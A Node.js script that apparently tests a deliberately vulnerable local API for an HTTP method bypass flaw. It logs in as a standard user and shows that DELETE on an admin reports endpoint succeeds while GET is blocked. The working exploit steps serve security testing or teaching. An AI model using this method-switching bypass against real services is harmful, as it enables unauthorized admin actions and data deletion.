const fetch = global.fetch || ((...args) =>
  import('node-fetch').then(({ default: nodeFetch }) => nodeFetch(...args))
);

const BASE_URL = 'http://localhost:3001/api';

async function login(username, password) {
  const response = await fetch(`${BASE_URL}/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password })
  });
  
  const data = await response.json();
  return data.token;
}

async function testHttpMethodBypass() {
  console.log('🔍 Testing HTTP Method Bypass Vulnerability (API5:2023)\n');
  
  try {
    // Login as standard user
    console.log('1. Logging in as standard user (user1)...');
    const userToken = await login('user1', 'userpass');
    console.log('✅ Standard user token obtained\n');
    
    // Test GET request (should be blocked)
    console.log('2. Testing GET /api/admin/reports with standard user...');
    const getResponse = await fetch(`${BASE_URL}/admin/reports`, {
      method: 'GET',
      headers: {
        'Authorization': `Bearer ${userToken}`,
        'Content-Type': 'application/json'
      }
    });
    
    const getData = await getResponse.json();
    console.log(`   Status: ${getResponse.status}`);
    console.log(`   Response: ${JSON.stringify(getData, null, 2)}`);
    console.log('✅ GET request properly blocked for standard user\n');
    
    // Test DELETE request (should work due to vulnerability)
    console.log('3. Testing DELETE /api/admin/reports with standard user...');
    const deleteResponse = await fetch(`${BASE_URL}/admin/reports`, {
      method: 'DELETE',
      headers: {
        'Authorization': `Bearer ${userToken}`,
        'Content-Type': 'application/json'
      }
    });
    
    const deleteData = await deleteResponse.json();
    console.log(`   Status: ${deleteResponse.status}`);
    console.log(`   Response: ${JSON.stringify(deleteData, null, 2)}`);
    console.log('🚨 VULNERABLE: DELETE request allowed for standard user!\n');
    
    // Login as admin
    console.log('4. Logging in as admin user (admin1)...');
    const adminToken = await login('admin1', 'adminpass');
    console.log('✅ Admin token obtained\n');
    
    // Test GET request with admin (should work)
    console.log('5. Testing GET /api/admin/reports with admin user...');
    const adminGetResponse = await fetch(`${BASE_URL}/admin/reports`, {
      method: 'GET',
      headers: {
        'Authorization': `Bearer ${adminToken}`,
        'Content-Type': 'application/json'
      }
    });
    
    const adminGetData = await adminGetResponse.json();
    console.log(`   Status: ${adminGetResponse.status}`);
    console.log(`   Response: ${JSON.stringify(adminGetData, null, 2)}`);
    console.log('✅ GET request works for admin user\n');
    
    console.log('📋 Summary:');
    console.log('   - GET /api/admin/reports: ✅ Properly secured (requires admin role)');
    console.log('   - DELETE /api/admin/reports: 🚨 VULNERABLE (no role check)');
    console.log('   - Standard users can perform admin actions by switching HTTP methods');
    
  } catch (error) {
    console.error('❌ Test failed:', error.message);
  }
}

// Run the test
testHttpMethodBypass(); 